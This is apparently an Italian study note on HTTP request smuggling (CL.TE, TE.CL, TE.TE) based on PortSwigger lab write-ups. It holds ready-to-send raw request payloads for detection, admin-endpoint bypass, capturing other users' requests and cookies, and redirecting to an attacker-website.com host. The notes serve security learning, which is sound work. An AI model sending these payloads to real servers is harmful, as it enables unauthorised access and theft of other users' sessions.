#Exploit_noti 

- [[#Finding Vulnerabilities]]
- [[#CL.TE]]
- [[#TE.CL]]
- [[#XSS]]
- [[#Open Redirect]]
- [[#Typical Errors]]

---
# Descrizione

**HTTP Request Smuggling** è una tecnica di attacco che sfrutta il fatto che due server (front-end e back-end) interpretano diversamente la fine di una richiesta HTTP. L'obiettivo è quello di ingannare il server per iniettare una richiesta all'interno di un'altra.

**Funzionamento:**
Quando invii una richiesta HTTP, puoi specificare la sua lunghezza con:
    - `Content-Length`: indica l'esatta lunghezza della request in byte (es: "admin" *5byte*)
    - `Transfer-Encoding: chunked`: indica di considerare parola per parola (es: "admin true" *2 chunk*)
        
Se i server non gestiscono questi header allo stesso modo, puoi creare **ambiguità** (smuggling).

**Tipi principali:**
- **CL.TE:** front-end (FE) usa `Content-Length`, back-end (BE) usa `Transfer-Encoding`.
- **TE.CL:** front-end usa `Transfer-Encoding`, back-end usa `Content-Length`.
- **TE.TE:** entrambi usano `Transfer-Encoding` ma uno viene ingannato tramite offuscamento.

> [!important]
> E' importantissimo indicare l'esatto numero al `Content-Length`; il suo valore può cambiare di molto a seconda se lo deve leggere il BE od il FE.

![[OAuth.png]]

> [!NOTE]
> **N.B: inserire nell'Inspector in 'Request attribute' di Burpsuite selezionare HTTP/1.1 e deselezionare dai settings "update Content-Length"** 

---

# Finding Vulnerabilities

In questa sezione vediamo come identificare le vulnerabilità (se presenti):

#### Scanner 1 ([writeup](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)):

```
POST /search HTTP/1.1 <-- inizia FE
Host: esempio.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49 
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1 <-- inizia BE
Foo: x
```

Se otteniamo la *errore pagina 404* allora significa che il BE ha eseguito correttamente la richiesta e quindi è vulnerabile a CL.TE

#### Scanner 2 ([writeup](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses))

```
POST / HTTP/1.1 <-- inizia FE
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e <-- lunghezza POST in esadecimale fino (x=1)
POST /404 HTTP/1.1 <-- inizia BE
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0 <-- termina lettura
```

Se otteniamo la *errore pagina 404* allora significa che il BE ha eseguito correttamente la richiesta e quindi è vulnerabile a CL.TE

---
# CL.TE

Il **front-end (FE)** interpreta il contenuto di `Content-Length`, mentre il **back-end (BE)** interpreta il contenuto di `Transfer-Encoding`.

#### Esempio 1 ([writeup](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)):

```
POST / HTTP/1.1 <-- inizia FE
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0 

G <-- inizia BE
```

Inviare la richiesta **due volte** perché:
	1. Il Front-End (FE) legge TE e interpreta la prima parte (fino a *'0'*) e lascia la seconda parte al Back-End (BE) che non sapendo interpretare per via della *'G'* la terrà in sospeso.
	2. Al secondo invio il FE leggerà nuovamente la stessa parte, ma il BE avvierà la richiesta precedente (quindi si conclude l'attacco)
#### Esempio 2 ([writeup](https://portswigger.net/web-security/request-smuggling)):

```
POST / HTTP/1.1 <-- inizia FE
Host: esempio.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c <-- lunghezza POST in esadecimale (fino x=1)
GPOST / HTTP/1.1 <-- inizia BE
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Inviare la richiesta **due volte** perché:
	1. Il Front-End (FE) legge TE e interpreta la prima parte (fino a *'5c'*) e lascia la seconda parte al Back-End (BE) che non sapendo interpretare per via della *'G'* (`GPOST`) la terrà in sospeso.
	2. Al secondo invio il FE leggerà nuovamente la stessa parte, ma il BE avvierà la richiesta precedente (quindi si conclude l'attacco)

#### Esempio 3 ([writeup](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)):

```
POST / HTTP/1.1 <-- inizia FE
Host: esempio.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c <-- lunghezza POST in esadecimale (fino x=1)
GPOST / HTTP/1.1 <-- inizia BE
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Il secondo TE col valore uguale a *'cow'* confonde il FE e BE pertanto aiuta a spezzare la richiesta in due parti.

---
# TE.CL 

Il **front-end (FE)** interpreta il contenuto di`Transfer-Encoding` , mentre il **back-end (BE)** interpreta il contenuto di `Content-Length`.

> [!warning]
> *NB: il parametro `Content-Length` è letto dal BE quindi deve rispecchiare l'esatto numero della richiesta letta da quest'ultimo.*

#### Esempio 1  ([writeup](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te) e [writeup](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)):

Facciamo eseguire al BE delle azioni che non sarebbero possibile da un utente esterno, ad esempio entrare in risorse protette (es: */admin*).

```
POST / HTTP/1.1 <-- inizia FE
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139 <-- lunghezza da '0...x='
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos <-- inizia BE
HTTP/1.1 Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

#### Captures requests

Se il CL è più lungo del necessario, il BE interpreterà le richieste successive come parte del body della richiesta corrente (smuggled request) e, per un attaccante sarà possibile leggerla per rubare info importanti (es: cookie) ([writeup](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)).  

# XSS

Se un'applicazione è vulnerabile a HTTP request smuggling e contemporaneamente a reflected XSS allora un attaccante potrebbe approfittarne **per colpire gli altri utenti** ([writeup](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss))

# Open Redirect

In alcuni casi è possibile sfruttare la vulnerabilità HTTP Request Smuggling per far **elaborare al BE una richiesta verso un sito malevolo.**

```
POST / HTTP/1.1 <-- inizia FE
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0 <-- inizia BE

GET /home HTTP/1.1
Host: attacker-website.com <-- attacco
Foo: X
```

# Typical Errors

|**Errore**|**Spiegazione**|
|---|---|
|**Read timeout**|Il server rimane in attesa di ulteriori dati che non arrivano, spesso perché `Content-Length` o `chunked encoding` sono sbagliati e la richiesta è incompleta.|
|**400 Bad Request**|La richiesta HTTP è malformata; il server si accorge di header inconsistenti (es. doppio Transfer-Encoding, Content-Length sbagliato, errori nei chunk).|
|**502 Bad Gateway**|Il proxy o load balancer tra te e il back-end non riesce a interpretare la risposta dal server back-end (perché hai desincronizzato la comunicazione).|
|**504 Gateway Timeout**|Il proxy non riceve risposta dal back-end entro il tempo limite, perché il parsing della richiesta è rimasto "bloccato".|
|**500 Internal Server Error**|Il server va in errore tentando di processare una richiesta non valida o danneggiata (specialmente su parsing HTTP chunked malformato).|
|**Connection closed unexpectedly**|Il server chiude la connessione prima di completare la lettura della richiesta, spesso a causa di dati di framing non corretti (come dimenticare `0\r\n\r\n` nel chunked).|
|**Request Smuggling not detected / no differential**|I due server (front-end e back-end) non si desincronizzano, quindi non vedi alcun effetto visibile; l'attacco fallisce "silenziosamente".|
|**Broken pipe**|(Raro) L'attaccante invia dati ma il server ha già chiuso la connessione, generando un errore a basso livello di rete.|
